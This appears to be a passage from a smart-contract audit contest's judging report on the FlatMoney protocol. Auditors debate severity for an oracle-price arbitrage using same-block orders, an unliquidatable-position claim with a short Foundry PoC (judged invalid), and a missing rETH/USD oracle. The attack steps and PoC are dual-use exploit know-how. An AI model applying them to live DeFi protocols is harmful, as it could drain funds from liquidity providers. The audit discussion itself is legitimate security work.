The protocol team fixed this issue in PR/commit https://github.com/dhedge/flatcoin-v1/pull/276.

**0xLogos**

Escalate 

Low (at least medium)

- trader fee should be small
- volatility should be high
- profit is small and not guaranteed, loss is possible
- can do roughly the same executing 2 last steps in 2 consecutive txs

**sherlock-admin2**

> Escalate 
> 
> Low (at least medium)
> 
> - trader fee should be small
> - volatility should be high
> - profit is small and not guaranteed, loss is possible
> - can do roughly the same executing 2 last steps in 2 consecutive txs

You've created a valid escalation!

To remove the escalation from consideration: Delete your comment.

You may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.

**shaka0x**

> * trader fee should be small

The PoC uses the trade fees mentioned in the documentation and in the test suite. We can argue that it can be increase, but by the same token it can also be decreased and make the attack even more profitable.

> * volatility should be high

A change of 0.1% is enough.

> * profit is small and not guaranteed, loss is possible

As I stated, the user can just cancel the limit order if it is not favorable, so no loss beyond the gas fees of the txs.

> * can do roughly the same executing 2 last steps in 2 consecutive txs

The attacker has no control over the change in the prices submitted between two transactions. Doing it atomically is the only way he can assured that the second is greater than the first or vice versa.


**0xLogos**

@shaka0x

hmm, i see...

- In poc mentioned vulnerability (avoid fee for limit orders) is used, without it there will be loss
- User can cancel limit order, but adjust order has risk to be executed with fee large fee
- User must first announce 2 orders and only after that seek for arb oportunity which increase complexity and risks

Attack easily can fail:
- Create a small leverage position.
- Announce an adjustment order to increase the size of the position by some amount.
- In the same block, announce a limit close order.
- After the minimum execution time has elapsed, attacker fails to retrieve two prices from the Pyth oracle where the second price is higher than the first one.
- Adjustment order is executed by keeper and attacker lost big fees.

**xiaoming9090**

Escalate. 

The risk rating of this issue should be Medium.

The only token in scope for this audit contest is rETH per the Contest's README. Thus, we will use rETH for the rest of the example.

Also, in the [setup script](https://github.com/sherlock-audit/2023-12-flatmoney/blob/bba4f077a64f43fbd565f8983388d0e985cb85db/flatcoin-v1/test/helpers/Setup.sol#L147), the `minExecutabilityAge` is set to 10 seconds and `maxExecutabilityAge` is set to 1 minute. The system will only accept the Pyth price that is generated within the time between T1 and T2 (in Green below), which is within the 1-minute range.

![image](https://github.com/sherlock-audit/2023-12-flatmoney-judging/assets/102820284/965eb5f4-41c6-4bf3-b7dd-5ea5807149ca)

For the attack to be profitable, the following equation needs to be satisfied (ignoring the gas fee for simplicity - but the attack will be slightly more difficult if we consider the gas fee. So we are being optimistic below)

```
Original Formula:
adjustmentSize * (secondPrice - firstPrice) - (adjustmentSize * tradeFees * 2) > 0

For it to break even against the trade fee
(secondPrice - firstPrice) > tradeFees * 2
(secondPrice - firstPrice) > 0.1% * 2
(secondPrice - firstPrice) > 0.2%
```

The first requirement for the attack to break even (gain of zero or more) is that the ETH increases by more than 0.2% within 1 minute (e.g., \$3000 to above \$3006), which might or might not happen. Note that ETH is generally not a volatile asset. My calculation shows that the price increase needs to be more than 0.2% to break even.

![image](https://github.com/sherlock-audit/2023-12-flatmoney-judging/assets/102820284/aab98baa-b357-4e13-b0a6-41700de093b0)

The second requirement is that while the malicious keeper is waiting for the right ETH price increase within the 1-minute timeframe if any other keeper executes EITHER the adjustment order OR limit close order, the attack path will be broken. The malicious keeper has to restart again. In addition, the malicious keeper will lose their trading fee when their malicious orders are being executed by someone else because a trade fee needs to be paid whenever an order is executed. Thus, this attack is generally unprofitable due to the high risk of failure, and when failure occurs, the malicious keeper needs to pay or lose the trade fee (no refund).

The report also mentioned the following, which could allow malicious keepers to cancel the limit order to mitigate the risk of loss. However, the problem is that the protocol is intended to be deployed on Base only (Per [Contest's Readme](https://github.com/sherlock-audit/2023-12-flatmoney/tree/bba4f077a64f43fbd565f8983388d0e985cb85db?tab=readme-ov-file#q-on-what-chains-are-the-smart-contracts-going-to-be-deployed)), which is similar to Optimism L2 that uses a sequencer. The sequencer operates in the FIFO (first in first out) manner with a queuing system. Thus, by the time the malicious keeper is aware of the unfavorable condition or some other keeper intends to execute their orders, it is already too late as the malicious keeper cannot front-run someone else TX due to the Sequence's queuing design. Even on Ethereum, there is no guarantee that one can always front-run a TX unless one pays an enormous amount of gas fee.

> In the case of not being able to obtain the required delta or observing that a keeper has already submitted a transaction to execute them before the delta is obtained, the user can simply cancel the limit order and will have just the adjustment order executed.

Lastly, the adjustment size of the position must be large enough to overcome the risk VS profit hurdle. My above chart shows that 10 ETH will give around 30 USD profit if the price increases by more than 0.02%, and 100 ETH will give around 300 USD profit if the attack is successful.

The protocol is designed in a manner where it is balanced most of the time (delta-neutral), using various incentives to bring the balance back. This means most of the time, the short (LPs) and long trader sides will be 100%-100%, respectively. The worst case it can go is 100%-120% as the system will prevent the skew to be more than 20%. Thus, there is a limit being imposed on the position size that a user can open. If the LP side is 100 ETH, and the current total long position size is 115 ETH. The maximum amount of position size one can open is left with 5 ETH. This is another constraint that the attacker faces.

**sherlock-admin2**

> Escalate. 
> 
> The risk rating of this issue should be Medium.
> 
> The only token in scope for this audit contest is rETH per the Contest's README. Thus, we will use rETH for the rest of the example.
> 
> Also, in the [setup script](https://github.com/sherlock-audit/2023-12-flatmoney/blob/bba4f077a64f43fbd565f8983388d0e985cb85db/flatcoin-v1/test/helpers/Setup.sol#L147), the `minExecutabilityAge` is set to 10 seconds and `maxExecutabilityAge` is set to 1 minute. The system will only accept the Pyth price that is generated within the time between T1 and T2 (in Green below), which is within the 1-minute range.
> 
> ![image](https://github.com/sherlock-audit/2023-12-flatmoney-judging/assets/102820284/965eb5f4-41c6-4bf3-b7dd-5ea5807149ca)
> 
> For the attack to be profitable, the following equation needs to be satisfied (ignoring the gas fee for simplicity - but the attack will be slightly more difficult if we consider the gas fee. So we are being optimistic below)
> 
> ```
> Original Formula:
> adjustmentSize * (secondPrice - firstPrice) - (adjustmentSize * tradeFees * 2) > 0
> 
> For it to break even against the trade fee
> (secondPrice - firstPrice) > tradeFees * 2
> (secondPrice - firstPrice) > 0.1% * 2
> (secondPrice - firstPrice) > 0.2%
> ```
> 
> The first requirement for the attack to break even (gain of zero or more) is that the ETH increases by more than 0.2% within 1 minute (e.g., \$3000 to above \$3006), which might or might not happen. Note that ETH is generally not a volatile asset. My calculation shows that the price increase needs to be more than 0.2% to break even.
> 
> ![image](https://github.com/sherlock-audit/2023-12-flatmoney-judging/assets/102820284/aab98baa-b357-4e13-b0a6-41700de093b0)
> 
> The second requirement is that while the malicious keeper is waiting for the right ETH price increase within the 1-minute timeframe if any other keeper executes EITHER the adjustment order OR limit close order, the attack path will be broken. The malicious keeper has to restart again. In addition, the malicious keeper will lose their trading fee when their malicious orders are being executed by someone else because a trade fee needs to be paid whenever an order is executed. Thus, this attack is generally unprofitable due to the high risk of failure, and when failure occurs, the malicious keeper needs to pay or lose the trade fee (no refund).
> 
> The report also mentioned the following, which could allow malicious keepers to cancel the limit order to mitigate the risk of loss. However, the problem is that the protocol is intended to be deployed on Base only (Per [Contest's Readme](https://github.com/sherlock-audit/2023-12-flatmoney/tree/bba4f077a64f43fbd565f8983388d0e985cb85db?tab=readme-ov-file#q-on-what-chains-are-the-smart-contracts-going-to-be-deployed)), which is similar to Optimism L2 that uses a sequencer. The sequencer operates in the FIFO (first in first out) manner with a queuing system. Thus, by the time the malicious keeper is aware of the unfavorable condition or some other keeper intends to execute their orders, it is already too late as the malicious keeper cannot front-run someone else TX due to the Sequence's queuing design. Even on Ethereum, there is no guarantee that one can always front-run a TX unless one pays an enormous amount of gas fee.
> 
> > In the case of not being able to obtain the required delta or observing that a keeper has already submitted a transaction to execute them before the delta is obtained, the user can simply cancel the limit order and will have just the adjustment order executed.
> 
> Lastly, the adjustment size of the position must be large enough to overcome the risk VS profit hurdle. My above chart shows that 10 ETH will give around 30 USD profit if the price increases by more than 0.02%, and 100 ETH will give around 300 USD profit if the attack is successful.
> 
> The protocol is designed in a manner where it is balanced most of the time (delta-neutral), using various incentives to bring the balance back. This means most of the time, the short (LPs) and long trader sides will be 100%-100%, respectively. The worst case it can go is 100%-120% as the system will prevent the skew to be more than 20%. Thus, there is a limit being imposed on the position size that a user can open. If the LP side is 100 ETH, and the current total long position size is 115 ETH. The maximum amount of position size one can open is left with 5 ETH. This is another constraint that the attacker faces.

You've created a valid escalation!

To remove the escalation from consideration: Delete your comment.

You may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.

**RealLTDingZhen**

This issue should be Low/informational. 

> After the minimum execution time has elapsed, retrieve two prices from the Pyth oracle where the second price is higher than the first one.

Because of the minimum execution time protection, such arbitrage opportunity is only possible when arbitrageurs can steadily guess where the market is going. If the market falls during the minimum execution time, arbitrageurs suffer more losses.


**shaka0x**

> This issue should be Low/informational.
> 
> > After the minimum execution time has elapsed, retrieve two prices from the Pyth oracle where the second price is higher than the first one.
> 
> Because of the minimum execution time protection, such arbitrage opportunity is only possible when arbitrageurs can steadily guess where the market is going. If the market falls during the minimum execution time, arbitrageurs suffer more losses.

The attack can be profitable even with small price movements. Given that prices are reported every 400ms, the chances of obtaining an increase in price are very high.

**nevillehuang**

Agree with @xiaoming9090 given the high dependency of price fluctuations within small periods of time, I believe medium severity to be more appropriate

**Czar102**

Fees are to make up for possible losses of this type, doing this attack atomically is practically the same as executing it within a few seconds.

Since this issue mentions a the fee bypass, and this is the only way it is of severity above Low, I think it should be duplicated with #212, since the impact of this issue can be High only because of the fee bypass.

Planning to accept the first escalation and consider this a duplicate of #212.

**shaka0x**

@Czar102 thank you for your feedback, but I don't understand in what sense this one could be considered as a duplicate of #212 What is explained in the issue is that in order to be profitable the gains due to the change in price have to be higher than the amount paid in fee. And I just point out that if we take into account that some fees can be avoided, as showed in #212, it is even easier to reach that profitability. But the issue is present independently of the fact that the fees can be avoided. The issue itself is not about avoiding fees, but about arbitraging the price.

Also, the performing the attack atomically is the only way of having control over the prices. To perform it in two blocks we have to rely on the second order not being executed by the keeper after we execute the first transaction in the previous block. By doing it atomically we ensure both orders are executed at the price we want, as long as we do it before the keeper (paying higher gas fees). If we execute the first order in block "n" and have to wait until block "n+1" to execute the second order, the keeper could just have executed it in block "n" after we executed ours.

**Czar102**

I believe this issue is a low severity one without #212. Thinking alternatively, this issue is another severe impact of the core issue #212 – lack of fees results in both this attack and revenue losses for the LPs.

I believe counterarguments to all other points have been provided in https://github.com/sherlock-audit/2023-12-flatmoney-judging/issues/216#issuecomment-1959552564 and https://github.com/sherlock-audit/2023-12-flatmoney-judging/issues/216#issuecomment-1956126680.

**shaka0x**

> I believe this issue is a low severity one without #212. Thinking alternatively, this issue is another severe impact of the core issue #212 – lack of fees results in both this attack and revenue losses for the LPs.

@Czar102 I politely ask you to read again the explanation of the issue. None of the calculations shown are counting on the effects of #212. There is no requirement of #212 to be present in order for the attack to be profitable. Even the escalator recognizes that in [this message](https://github.com/sherlock-audit/2023-12-flatmoney-judging/issues/216#issuecomment-1959552564), only that considers the impact should not be high but medium, what I still disagree.

As I showed, the resultant profit of the attack is:
```
adjustmentSize * (secondPrice - firstPrice) - (adjustmentSize * tradeFees * 2)
```

That is **without** the outcome of the issue #212. If we take this outcome into account, the result would be:
```
adjustmentSize * (secondPrice - firstPrice) - (adjustmentSize * tradeFees)
```

But my assertion is based on the first case. I only pointed out, that the outcome of the attack could be even greater if we combine it with #212.

**nevillehuang**

I too fail to see how this issue is a duplicate of #212. They share completely separate root causes. With the impact described by LSW [here](https://github.com/sherlock-audit/2023-12-flatmoney-judging/issues/216#issuecomment-1959552564), the issue is only worsened if price fluctuations is significant, so it should be downgraded to medium severity given dependency on external factors.

**RealLTDingZhen**

Sorry to disturb, but I still haven't figured out how this arbitrage works. After users announce leverage adjust, they have to wait 10s for their order to be executed. How could the arbitrageur know whether the value returned by oracle in the same block after ten seconds will be lower or higher? If the corresponding block does not fulfill the condition, then the transaction is likely to be executed by another keeper, making it unprofitable for the arbitrageurs.

 If this path is not feasible, such logic flaw should not cause any financial loss, right?


**shaka0x**

The attacker does not know the future price, but can take advantage of price increases. The issue is that during the lifespan of the block many prices are valid (a new price is emitted every 400ms), and the flaw in the design is that multiple prices are allowed to be submitted in the same block. So the requirement is finding two prices during the lifespan of the block that make the arbitrage profitable.

In the worst case scenario for the attacker, they are not found or are found before keeper has executed the orders (here we are assuming that keepers will try to execute all orders ASAP and be faster, which is not necessarily the case), so the attacker will lose an amount equivalent to the fees paid. But specially in moments of high volatility the attacker is incentivized to perform the attack, as the potential profit compensates the possible losses in trade fees.

**RealLTDingZhen**

Ah I got it, when there are no fees, the arbitrageur's only risk is the market movement in 10s. In an balanced market, arbitrageurs can always make a profit through it.

**Czar102**

@shaka0x @nevillehuang How I see it is that there are two elements to this issue:
1. The ability to use the same price twice, which is the case even if it wouldn't be possible to do that in a single transaction. It's impossible for profits from this to exceed costs in fees, as shown by @xiaoming9090. This issue is informational.
2. The ability to extract value if there are no fees. Then, this becomes a High severity issue, since the fees don't make up for possible losses, but this is really just another impact of lack of fees, hence I thought to duplicate it with #212.

I hope my approach makes sense now. In the end, whether this issue is invalidated or considered a duplicate of #212 won't impact the reward calculation at all.

@nevillehuang If you still think this issue should not be duplicated with #212, I'll consider it informational.

**nevillehuang**

@Czar102 Can you elaborate on point 1? Why would it be impossible for profits to exceed cost in fees given price fluctuations cannot be predicted? I believe this shouldn't be duplicated with #212.

**shaka0x**

> 1. The ability to use the same price twice, which is the case even if it wouldn't be possible to do that in a single transaction. It's impossible for profits from this to exceed costs in fees, as shown by @xiaoming9090. This issue is informational.

@Czar102 The analysis of @xiaoming9090 shows that it is profitable as long as the price is increase is more than 0.2%. In fact can be very profitable, while the loss is capped to the trading fees. Can you explain why you think it says that it is impossible to be profitable?

Quoting his analysis:

> My calculation shows that the price increase needs to be more than 0.2% to break even.


**shaka0x**

To add a bit of context, just looking at today's Pyth price feed for [ETH/USD](https://pyth.network/price-feeds/crypto-eth-usd?range=1D) I have found some movements higher than 2% in a minute. That is, a movement 10 times bigger than the amount required to break even.

**Czar102**

It seems I misunderstood the scope here. Is rETH/ETH or rETH/USD a tradeable pair here? I thought rETH/ETH is being traded, so there is no way there is a difference of 0.2% in price within 60 seconds.

**shaka0x**

Hey @Czar102 the intended pair used for the protocol is rETH/USD. However, as pointed in #90 and duplicates, there is no such pair in Chainlink, so the protocol will have to either use ETH/USD (original design intent) or adapt the code to use rETH/USD. In any case, the pair is against USD.

**Czar102**

I see now. I believe this is a valid High severity issue. I think this attack persists even if executed non-atomically. @nevillehuang @shaka0x would you agree?

Planning to reject the escalation and leave the issue as is.

**xiaoming9090**

@Czar102 Just wanted to add on. Other escalators (@0xLogos & @RealLTDingZhen) and I have raised points that the attackers have a high chance of losing their fees, potential risk faces, and external conditions required for executing this attack. Many attacks could be carried out when prices move up or down within a timeframe, but the potential risk involved might deter attackers from carrying out the attack. Thus, I believe these should be taken into consideration, and a Medium would be more appropriate.

**shaka0x**

> I see now. I believe this is a valid High severity issue. I think this attack persists even if executed non-atomically. @nevillehuang @shaka0x would you agree?
> 
> Planning to reject the escalation and leave the issue as is.

The issue is that for performing it not atomically, you have to assume that keepers will not execute the orders ASAP. Executing it atomically, it is much easier to perform if keepers do not execute it ASAP, but still feasible if they do.

As for the risk of losses, in moments of high volatility it is easy to reach the required movement and the risk of losing the amount of the trade fees is bearable in contracts with the potential profit. Also, note that it is a necessary lag in the submission of the transaction (it is required to query the offchain price, build the request and submit the transaction), that for keepers is augmented, as they will have to process many orders in the same block. So the attacker can just cancel the second order if in the first seconds of the order being executable the requirements for profitability are not reached.

**xiaoming9090**

> I see now. I believe this is a valid High severity issue. I think this attack persists even if executed non-atomically. @nevillehuang @shaka0x would you agree?
> 
> Planning to reject the escalation and leave the issue as is.

@Czar102 The attack has to be carried out atomically. Shaka has highlighted https://github.com/sherlock-audit/2023-12-flatmoney-judging/issues/216#issuecomment-1957270402 and https://github.com/sherlock-audit/2023-12-flatmoney-judging/issues/216#issuecomment-1968837334 that the attack has to be executed atomically to be effective.

The attacker is effectively racing against time to find the right price deviation (two price data) within the 60-second limit to perform the attack within a single block. Also, if the keepers are robust, there is a high chance that the malicious orders would be executed early by other keepers, and the attacker would lose their fee before the attacker managed to find the right price deviation. In addition, it is not straightforward to cancel the order at the last minute if it is deemed unprofitable based on my explanation in this comment (https://github.com/sherlock-audit/2023-12-flatmoney-judging/issues/216#issuecomment-1959552564), Given these external conditions in place, I believe a Medium would be more appropriate.

**Czar102**

I see. This seems to be borderline High/Med, I think considering it a valid Medium is justified. @shaka0x would you agree that there are some serious risks taken similar in size to the potential yield?

**shaka0x**

@Czar102  Yes, I agree that the attacker is assuming the risk of potential losses. My reasoning is that they are quite low in comparison with the potential profit, but I guess here we enter a subjective area.

**Czar102**

Agree. Planning to consider this issue a valid unique Medium.

**Czar102**

Result:
Medium
Unique

**sherlock-admin2**

Escalations have been resolved successfully!

Escalation status:
- [0xLogos](https://github.com/sherlock-audit/2023-12-flatmoney-judging/issues/216/#issuecomment-1956126680): accepted
- [xiaoming9090](https://github.com/sherlock-audit/2023-12-flatmoney-judging/issues/216/#issuecomment-1959552564): rejected

# Issue H-16: Malicious User can create a position that nobody can liquidate 

Source: https://github.com/sherlock-audit/2023-12-flatmoney-judging/issues/227 

## Found by 
0xMAKEOUTHILL, LTDingZhen
## Summary

In function `executeClose`, after burning an NFT, it will only detect and clear existing limit orders, but not detect existing delayed orders. This allows an attacker to add margin and increase position size to a `tokenID` where no NFT exists to create a position that cannot be liquidated. The platform risks having bad debt that cannot be eliminated.

## Vulnerability Detail

In flatcoin protocol, user can close a position by calling `announceLimitOrder` or `announceLeverageClose`. When keepers try to execute the limit order or the delayed order, function `executeClose` in LeverageModule is called. In `executeClose`, there is a check for cancellation of any existing limit orders on the position, but **does not cancel an existing Delayed order** if `executeClose` is called by `executeLimitOrder()`!

    function executeClose(
        address _account,
        address _keeper,
        FlatcoinStructs.Order calldata _order
    ) external whenNotPaused onlyAuthorizedModule returns (int256 settledMargin) {
            ...
            // Delete position storage
            vault.deletePosition(announcedClose.tokenId);
        }

        // Cancel any existing limit order on the position
        ILimitOrder(vault.moduleAddress(FlatcoinModuleKeys._LIMIT_ORDER_KEY)).cancelExistingLimitOrder(
            announcedClose.tokenId
        );

        // A position NFT has to be unlocked before burning otherwise, the transfer to address(0) will fail.
        _unlock(announcedClose.tokenId);
        _burn(announcedClose.tokenId);

        vault.updateStableCollateralTotal(int256(announcedClose.tradeFee)); // pay the trade fee to stable LPs

        // Settle the collateral.
        vault.sendCollateral({to: _keeper, amount: _order.keeperFee}); // pay the keeper their fee
        vault.sendCollateral({to: _account, amount: uint256(settledMargin) - totalFee}); // transfer remaining amount to the trader

        emit FlatcoinEvents.LeverageClose(announcedClose.tokenId);
    }

When performing leverage adjustments, since the validation of the caller's possession of the NFT is performed at `announceLeverageAdjust`, `executeAdjust` does not have a test for the existence of a current position, and allows a position with all parameters 0 to operate normally.

Consider path below:

1. Bob has a position and calls `announceLimitOrder` to create a limit order that can be executed immediately.
2. Bob calls `announceLeverageAdjust` to create a delayed order to add some margin and increase position size. Since the limit order has not been executed at this time, all validations in `announceLeverageAdjust` will pass.
3. a keeper execute the limit order to close Bob's position, and clear its storage. At this point, since only the presence of a limit order is checked, the delayed order is still valid.
4. a keeper execute the delayed order, "create" a new position on the same tokenID. Because the NFT has been destroyed, its owner is address 0. Nobody can liquidate or close this position because OZ's ERC721 doesn't allow burning non-existent token.

## Impact

Attackers can create positions which nobody can liquidate, so there is a risk that the platform will incur bad debts that cannot be eliminated.

## Code Snippet

https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/LeverageModule.sol#L255-L317
https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/LeverageModule.sol#L147-L248

## Tool used

Manual Review

## Recommendation

In function executeClose, only cancel any existing limit order on the position is not enough. delayed order should also be canceled.



## Discussion

**sherlock-admin**

1 comment(s) were left on this issue during the judging contest.

**takarez** commented:
>  valid: high(10)



**rashtrakoff**

I think the better solution would be to check if a position exists by either checking the owner of the position (should not be the null address) or the size of the position (should be strictly greater than 0).

**nevillehuang**

Escalate 

@rashtrakoff I believe this is possibly misjudged by me as valid based on the PoC provided by a watson mentioned [here](https://discord.com/channels/812037309376495636/1199005620536356874/1209769782929264730)

**sherlock-admin2**

> Escalate 
> 
> @rashtrakoff I believe this is possibly misjudged by me as valid based on the PoC provided by a watson mentioned [here](https://discord.com/channels/812037309376495636/1199005620536356874/1209769782929264730)

You've created a valid escalation!

To remove the escalation from consideration: Delete your comment.

You may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.

**0xjuaan**

POC here, was placed in `Liquidate.t.sol`
```
function test_cantLiquidatePosition() public {
        setWethPrice(1000e8);

        uint256 tokenId = announceAndExecuteDepositAndLeverageOpen({
            traderAccount: alice,
            keeperAccount: keeper,
            depositAmount: 100e18,
            margin: 10e18,
            additionalSize: 30e18,
            oraclePrice: 1000e8,
            keeperFeeAmount: 0
        });
        
        vm.prank(alice);
        limitOrderProxy.announceLimitOrder(tokenId, 750e8, 1250e8);

        // user announces order
        announceAdjustLeverage(alice, tokenId, 3e18, 3e18, 0); //e Alice adds 3e18 margin, 1e18 size

        skip(uint256(vaultProxy.minExecutabilityAge())); // must reach minimum executability time
        
        bytes[] memory priceUpdateData = getPriceUpdateData(1000e8);
        limitOrderProxy.executeLimitOrder{value: 1}(tokenId, priceUpdateData);

        // This reverts, due to [ERC721: invalid token ID]
        executeAdjustLeverage(keeper, alice, 1000e8);
    }
```

**securitygrid**

Escalate
This issue is not valid beacause the attack described in the report would not be successful.
The attack scenario described in the report would not be successful.
There are two situations for an adjustment order:
1. If `announcedAdjust.additionalSizeAdjustment` is greater than 0, tx will revert [here](https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/LeverageModule.sol#L226).
2. If `announcedAdjust.additionalSizeAdjustment` is equal to 0, it means that the position only has the margin provided by the attacker and does not have additionalSize. This will not lead to bad debts. Moreover, it is self-harm for the attacker.

**sherlock-admin2**

> Escalate
> This issue is not valid beacause the attack described in the report would not be successful.
> The attack scenario described in the report would not be successful.
> There are two situations for an adjustment order:
> 1. If `announcedAdjust.additionalSizeAdjustment` is greater than 0, tx will revert [here](https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/LeverageModule.sol#L226).
> 2. If `announcedAdjust.additionalSizeAdjustment` is equal to 0, it means that the position only has the margin provided by the attacker and does not have additionalSize. This will not lead to bad debts. Moreover, it is self-harm for the attacker.

You've created a valid escalation!

To remove the escalation from consideration: Delete your comment.

You may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.

**RealLTDingZhen**

Good catch. This issue is invalid. Even if `announcedAdjust.additionalSizeAdjustment` = 0 could pass the check, `checkLeverageCriteria(newMargin, newAdditionalSize)` would fail. So the path is not possible.

**MAKEOUTHILL6**

I agree this is invalid.


**Czar102**

Planning to accept the escalation and invalidate the issue.

**Czar102**

Result:
Invalid
Has duplicates

**sherlock-admin2**

Escalations have been resolved successfully!

Escalation status:
- [nevillehuang](https://github.com/sherlock-audit/2023-12-flatmoney-judging/issues/227/#issuecomment-1956080317): accepted
- [securitygrid](https://github.com/sherlock-audit/2023-12-flatmoney-judging/issues/227/#issuecomment-1956108239): rejected

**securitygrid**

@Czar102 why was my escalation rejected?

**Czar102**

@securitygrid
This is because the first escalation meant the same outcome (even though didn't state it explicitly), and only one escalation can be accepted on an issue not to punish the Lead Judge twice for the same mistake, so I accepted the first one.

**securitygrid**

@Czar102 Doesn't this affect my escalation ratio?

# Issue M-1: Protocol won't be able to get rETH/USD price from OracleModule 

Source: https://github.com/sherlock-audit/2023-12-flatmoney-judging/issues/90 

The protocol has acknowledged this issue.

## Found by 
Bauer, HSP, LTDingZhen, Psyduck, SBSecurity, dimulski, ge6a, ni8mare, shaka
## Summary
Protocol won't be able to get rETH/USD price from OracleModule because rETH/USD is supported by Chainlink on Base Chain.

## Vulnerability Detail
FlatMoney uses rETH as collateral and the price will be retrieved from Pyth Network Oracle, as said in the Audit Page:
> **Are there any off-chain mechanisms or off-chain procedures for the protocol (keeper bots, input validation expectations, etc)?**

> The protocol uses Pyth Network collateral (rETH) price feed. This is an offchain price that is pulled by the keeper and pushed onchain at time of any order execution.

While Pyth is used as **Offchain Oracle**, Chainlink Price Feed is used as **Onchain oracle**, when [get price](https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/OracleModule.sol#L86) from **OracleModule**, protocol will check the **diffPercent** between the 2 oracles and the transaction will revert if **diffPercent** is larger than **maxDiffPercent**:
```solidity
        uint256 priceDiff = (int256(onchainPrice) - int256(offchainPrice)).abs();
        uint256 diffPercent = (priceDiff * 1e18) / onchainPrice;
        if (diffPercent > maxDiffPercent) revert FlatcoinErrors.PriceMismatch(diffPercent);
```

Because it only makes sense to compare the price of the same collateral token, as rETH/USD price is retrieved from Pyth Oracle, the Chainlink Price Feed should also return rETH/USD. Unfortunately, rETH/USD is not supported by Chainlink on Base Chain, so there is no way to get rETH/USD price. 

Protocol may choose an alternative Chainlink Price Feed, for example, ETH/USD, however, the price difference between ETH and rETH can be significant (at the time of wrting, [RETH / ETH](https://www.coingecko.com/en/coins/rocket-pool-eth/eth) is `1.1`), results in **diffPercent** being much larger than a rational **maxDiffPercent** and transaction will always revert, protocol won't be able to get price from OracleModule and this renders the whole protocol useless.

## Impact
Protocol won't be able to get price from **OracleModule**, and protocol becomes useless.

## Code Snippet
https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/OracleModule.sol#L106

## Tool used
Manual Review

## Recommendation
Protocol should combine 2 Chainlink Price Feeds ([ETH/USD](0x71041dddad3595F9CEd3DcCFBe3D1F4b0a16Bb70) and [rETH/ETH](0xf397bF97280B488cA19ee3093E81C0a77F02e9a5)) to get the rETH/USD price data on Base Chain.



## Discussion

**sherlock-admin**

1 comment(s) were left on this issue during the judging contest.

**takarez** commented:
>  invalid: 



**nevillehuang**

@rashtrakoff I believe this is a valid medium severity issue, there indeed are no rETH/USD chainlink oracles on base chain. Based on code logic during the time of contest, wouldn't this cause a revert?

**rashtrakoff**

@nevillehuang , the protocol couldn't have been deployed if we didn't have rETH/USD oracle. It was an oversight on our behalf to not have properly checked the oracles available. We already have an audited version of contracts to get rETH/USD price based on rETH/ETH exchange rate and ETH/USD price. We internally don't believe this to be an issue but given that the code indeed wouldn't have worked/depolyable, we understand if you decide this as an issue. Cc @itsermin @D-Ig.

**sherlock-admin2**

> Escalate
> 
> This issue should be HIGH as it renders the protocol unworkable/undeployable.
> 
> 

You've deleted an escalation for this issue.

**securitygrid**

Escalate
This is not valid. This is not a matter of contract.

**sherlock-admin2**

> Escalate
> This is not valid. This is not a matter of contract.

You've created a valid escalation!

To remove the escalation from consideration: Delete your comment.

You may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.

**xiaoming9090**

Escalate.

The protocol would not even be deployed without the rETH/USD oracle. Thus, there is no possibility of this issue occurring to begin with. So, a Low is more appropriate for this issue.

**sherlock-admin2**

> Escalate.
> 
> The protocol would not even be deployed without the rETH/USD oracle. Thus, there is no possibility of this issue occurring to begin with. So, a Low is more appropriate for this issue.

You've created a valid escalation!

To remove the escalation from consideration: Delete your comment.

You may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.

**midori-fuse**

A criteria for medium risk is that

> Breaks core contract functionality, rendering the contract useless or leading to loss of funds.

Because:
- The broken core functionality is the fetching of rETH/USD price.
- Since the contract cannot be deployed without a code change, the contract is rendered useless.
- This issue cannot be fixed without an in-scope code change, and the info of the other oracle was not present as part of the contest.

It certainly qualifies as a medium risk issue by the rules does it not?

**itsermin**

Just to chime in here. There will be no code change here. The oracle contract will be provided by dHedge protocol: https://github.com/dhedge/V2-Public/blob/master/contracts/priceAggregators/ETHCrossAggregator.sol

This contract can combine the rETH/ETH and ETH/USD oracles.

**midori-fuse**

"Not using the in-scope code, but externally provided code" is itself a code change.

The validity of this issue then comes down to whether the contest documentation mention or imply that the OracleModule contract was the intended oracle.
- This can apply if there are no other in-scope oracle contracts, and the contest docs do not mention the existence of another oracle module. Then it's a valid deduction that the only oracle in the contest scope has to be the intended oracle.

If a conclusion of an external oracle cannot be reasonably reached using the given contest resources, then this issue should fit into the medium criteria.

**NishithPat**

> The protocol would not even be deployed without the rETH/USD oracle. Thus, there is no possibility of this issue occurring to begin with. So, a Low is more appropriate for this issue.

Yes, but Watsons are supposed to audit the code that's given to them. In the current state of the code, this is indeed an issue. 

**nevillehuang**

Agree with @midori-fuse points, I believe this should remain as medium severity, given the original contract cannot integrate the intended rETH/USD oracle originally, and required a completely new separate [contract as mentioned by the sponsor](https://github.com/sherlock-audit/2023-12-flatmoney-judging/issues/90#issuecomment-1959718314).

**Evert0x**

Planning to accept escalation and invalidate issue

There are no funds at risk since the protocol wouldn't be able to get deployed


**midori-fuse**

@Evert0x Can you please provide explanation on why it doesn't fit in the [second criteria of medium severity](https://docs.sherlock.xyz/audits/judging/judging#v.-how-to-identify-a-medium-issue)? The criteria certainly mentions rendering the contract useless as a condition.

Furthermore, if the reasoning is that protocol cannot be deployed, then all findings are invalid since the protocol won't be deployed anyway isn't it?

**0xjuaan**

I believe that the root cause for this bug would be an incorrect deployment script. However the deployment script is out of scope. 

**midori-fuse**

Understandable. I do not have more context to add then.

**RealLTDingZhen**

I have a few things to add:

Sherlock used to always think that the inability to deploy/use the current version of the contract's code on a specific chain was a valid problem:

[pengun - CREATE3 is not available in the zkSync Era.](https://github.com/sherlock-audit/2023-09-Gitcoin-judging/issues/862)

[HHK - computePoolAddress() will not work on ZkSync Era](https://github.com/sherlock-audit/2023-10-real-wagmi-judging/issues/104)

